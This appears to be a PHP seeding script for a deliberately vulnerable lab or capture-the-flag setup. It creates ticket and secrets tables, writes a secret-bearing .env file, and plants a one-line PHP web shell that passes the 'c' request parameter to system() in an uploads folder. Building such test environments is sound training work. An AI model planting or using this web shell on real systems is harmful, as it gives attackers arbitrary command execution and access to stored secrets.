<?php
require __DIR__ . '/common.php';
$db = db();
$db->exec('CREATE TABLE IF NOT EXISTS tickets (id INTEGER PRIMARY KEY, title TEXT, body TEXT)');
$db->exec('CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, username TEXT, token TEXT)');
$db->exec('DELETE FROM tickets'); $db->exec('DELETE FROM secrets');
$db->exec("INSERT INTO tickets (title,body) VALUES ('Printer jam','Floor 2'),('VPN slow','Remote office')");
$tok = $SEED['sql_token'];
$db->prepare('INSERT INTO secrets (username,token) VALUES (?,?)')->execute(['service', $tok]);
// ensure .env
file_put_contents(__DIR__ . '/.env', $SEED['env_secret'] . "\nDB_HOST=127.0.0.1\n");
// webshell
$ws = preg_replace('/[^a-z0-9_.-]/i', '', $SEED['webshell']);
if ($ws) {
  @mkdir(__DIR__ . '/uploads', 0755, true);
  file_put_contents(__DIR__ . '/uploads/' . $ws, "<?php\nif(isset(\$_REQUEST['c'])){ system(\$_REQUEST['c']); }\n");
}
echo "db ok\n";
